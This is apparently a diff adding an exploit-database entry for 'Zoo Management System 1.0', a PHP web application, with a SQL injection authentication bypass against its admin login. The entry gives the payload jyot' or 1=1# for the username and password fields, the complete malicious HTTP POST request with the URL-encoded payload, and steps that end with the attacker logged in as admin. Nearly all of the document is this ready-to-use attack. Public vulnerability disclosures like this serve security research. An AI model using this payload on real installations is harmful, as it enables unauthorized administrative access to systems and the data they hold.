@@ -1,0 +1,31 @@
+# Exploit Title: Zoo Management System 1.0 - Authentication Bypass
+# Date: 02/10/2020
+# Exploit Author: Jyotsna Adhana
+# Vendor Homepage: https://phpgurukul.com/zoo-management-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=12723
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+Step 1: Open the URL http://localhost/zoo/zms/admin/index.php
+
+Step 2: use payload jyot' or 1=1# in user and password field
+
+Malicious Request
+
+POST /zoo/zms/admin/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/zoo/zms/admin/index.php
+Cookie: PHPSESSID=s22oss00i0ob4hcnsgkobb9r7p
+Upgrade-Insecure-Requests: 1
+
+username=jyot%27+or+1%3D1+%23&password=jyot%27+or+1%3D1+%23&login=
+
+Step 3: You will be logged in as admin.
